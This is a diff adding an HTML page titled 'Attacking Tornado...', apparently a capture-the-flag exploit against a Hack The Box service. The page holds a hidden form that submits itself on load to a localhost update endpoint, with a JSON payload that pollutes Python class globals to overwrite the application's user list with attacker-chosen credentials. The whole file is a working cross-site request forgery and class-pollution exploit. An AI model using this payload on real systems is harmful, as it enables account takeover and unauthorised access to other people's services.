@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Attacking Tornado...</h1>
+    
+    <form id="bbt" action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"machine_id": "host-6667", "__class__": {"__init__": {"__globals__": {"USERS": [{"username": "lean@tornado-service.htb", "password": "123"}]}}}, "trash": "' value='"}'>
+    </form>
+
+    <script>
+        window.onload = function() {
+            // Tự động submit form ở trang chính (Top-level)
+            console.log("[+] Submitting form to localhost!");
+            document.getElementById('bbt').submit();
+        };
+    </script>
+</body>
+</html>
